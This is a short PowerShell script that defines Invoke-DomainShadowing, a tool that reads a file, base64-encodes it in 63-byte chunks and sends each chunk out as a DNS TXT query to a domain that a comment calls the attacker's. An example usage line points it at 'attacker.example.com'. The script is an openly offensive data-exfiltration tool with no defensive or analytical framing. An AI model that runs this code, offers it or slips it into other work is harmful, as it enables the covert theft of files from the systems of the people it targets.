function Invoke-DomainShadowing {
    param (
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $true)]
        [string]$Domain  # Attacker's domain to receive the DNS queries
    )

    $ChunkSize = 63  # Hardcoded chunk size

    # Function to split the file content into chunks of equal size
    function Split-FileIntoChunks {
        param (
            [byte[]]$Content,
            [int]$ChunkSize
        )

        $chunks = @()
        $totalChunks = [math]::Ceiling($Content.Length / $ChunkSize)

        for ($i = 0; $i -lt $totalChunks; $i++) {
            $startIndex = $i * $ChunkSize
            $chunk = $Content[$startIndex..([math]::Min($startIndex + $ChunkSize - 1, $Content.Length - 1))]
            $chunks += [PSCustomObject]@{
                Index = $i
                Data = [System.Convert]::ToBase64String($chunk)
            }
        }

        return $chunks
    }

    # Read the file content
    $fileContent = [System.IO.File]::ReadAllBytes($FilePath)

    # Split the content into chunks
    $chunks = Split-FileIntoChunks -Content $fileContent -ChunkSize $ChunkSize

    # Send each chunk as a DNS query and log the results
    foreach ($chunk in $chunks) {
        $query = "$($chunk.Index).$($chunk.Data).$Domain"
        try {
            $result = Resolve-DnsName -Type TXT -Name $query -Server $Domain
            if ($result) {
                Write-Output "Successfully sent chunk $($chunk.Index)"
            } else {
                Write-Output "Failed to send chunk $($chunk.Index)"
            }
        } catch {
            Write-Output "Error sending chunk $($chunk.Index): $_"
        }
    }
}

# Example usage
# Invoke-DomainShadowing -FilePath "C:\path\to\your\file.zip" -Domain "attacker.example.com"
